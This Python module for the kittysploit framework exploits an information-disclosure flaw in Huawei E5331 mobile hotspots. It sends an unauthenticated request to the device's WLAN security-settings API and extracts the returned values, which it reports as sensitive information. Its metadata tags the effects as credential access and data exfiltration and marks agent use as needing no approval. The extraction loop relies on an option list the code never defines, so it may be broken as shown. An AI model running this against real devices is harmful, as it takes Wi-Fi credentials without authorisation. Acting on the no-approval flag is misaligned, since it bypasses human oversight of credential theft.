#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Huawei E5331 Info Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Huawei E5331 Info Disclosure',
        'description': 'Module exploits information disclosure vulnerability in Huawei E5331 MiFi Mobile Hotspotdevices. If the target is vulnerable it allows to read sensitive information.',
        'author': ['J. Greil https://www.sec-consult.com', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/32161/'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address: 192.168.1.1")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET",
            path="/api/wlan/security-settings",
        )

        if response is None:
            return

        res = []
        for option in self.opts:
            regexp = "<{}>(.+?)</{}>".format(option, option)
            value = re.findall(regexp, response.text)
            if value:
                res.append((option, value[0]))

        if len(res):
            print_success("Found sensitive information!")
            print_table(("Option", "Value"), *res)
    def check(self):
        response = self.http_request(
            method="GET",
            path="/api/wlan/security-settings",
        )
        if response is None:
            return False  # target is not vulnerable

        res = []
        for option in self.opts:
            regexp = "<{}>(.+?)</{}>".format(option, option)
            value = re.findall(regexp, response.text)
            if value:
                res.append(value)

        if len(res):
            return True  # target is vulnerable

        return False  # target is not vulnerable
